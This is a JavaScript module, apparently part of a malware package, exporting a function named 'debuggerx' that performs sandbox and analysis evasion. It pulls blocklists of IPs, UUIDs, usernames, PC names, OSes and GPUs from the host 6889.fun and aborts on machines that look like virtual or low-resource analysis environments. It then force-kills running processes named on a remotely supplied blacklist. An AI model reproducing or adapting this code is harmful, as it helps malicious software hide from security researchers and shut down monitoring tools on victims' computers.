const util = require("util");
const exec = util.promisify(require("child_process").exec);
const axios = require("axios");

async function debuggerx(enable, ip, disk, ram, uuid, cpucount, os, cpu, gpu, windowskey, windowsversion) {
    if (enable !== "yes") return;
    try {
        const PcName = 
            process.env.COMPUTERNAME;
        
        const userName =
            process.env.USERNAME
            || process.env.SUDO_USER
            || process.env.C9_USER
            || process.env.LOGNAME
            || process.env.USER
            || process.env.LNAME
            || process.env.USERNAME;

        const [
            _,
            __,
            ___,
            ____,
            _____,
            ______,
        ] = await Promise.all([
            ips(ip),
            uuids(uuid),
            usernames(userName),
            pcnames(PcName),
            oss(os),
            gpus(gpu),
        ]);

        if (
            (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2) ||
            (!isNaN(cpucount) && cpucount < 2)
            || _
            || __
            || ___
            || ____
            || _____
            || ______
        ) {
            process.abort();
        }
        try {
            apps();
        } catch (e) {
            return console.error(e);
        }
    } catch (e) {
        return console.error(e);
    }
};

async function apps() {
    try {
        const { stdout } = await exec("tasklist");
        const _ = await axios.get(
            "https://6889.fun/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
        );
        const json = _.data;
        const res = json.blacklistedprog;
        const running = stdout.split(/\r?\n/);

        running.forEach((p) => {
            const name = p
                .split(/\s+/)[0]
                .replace(".exe", "");

            if (res.includes(name)) {
                try {
                    exec(`taskkill /F /IM ${name}.exe`, (e) => {
                        if (e) { } else { }
                    });
                } catch (err) { }
            }
        });
    } catch (error) { }
}

async function gpus(x) {
    try {
        const _ = await axios.get(
            "https://6889.fun/api/aurathemes/bypass/blocked/gpus?aurathemes=true",
        );
        const res = _.data;
        return res.includes(x);
    } catch (e) {
        return false;
    }
}

async function oss(x) {
    try {
        const _ = await axios.get(
            "https://6889.fun/api/aurathemes/bypass/blocked/oss?aurathemes=true",
        );
        const res = _.data;
        return res.includes(x);
    } catch (e) {
        return false;
    }
}

async function pcnames(x) {
    try {
        const _ = await axios.get(
            "https://6889.fun/api/aurathemes/bypass/blocked/pcnames?aurathemes=true",
        );
        const res = _.data;
        return res.includes(x);
    } catch (e) {
        return false;
    }
}

async function usernames(x) {
    try {
        const _ = await axios.get(
            "https://6889.fun/api/aurathemes/bypass/blocked/progr?aurathemes=true",
        );
        const res = _.data;
        return res.includes(x);
    } catch (e) {
        return false;
    }
}

async function uuids(x) {
    try {
        const _ = await axios.get(
            "https://6889.fun/api/aurathemes/bypass/blocked/uuids?aurathemes=true",
        );
        const res = _.data;
        return res.includes(x);
    } catch (e) {
        return false;
    }
}

async function ips(x) {
    try {
        const _ = await axios.get(
            "https://6889.fun/api/aurathemes/bypass/blocked/ips?aurathemes=true",
        );
        const res = _.data;
        return res.includes(x);
    } catch (e) {
        return false;
    }
}

module.exports = {
    debuggerx
}
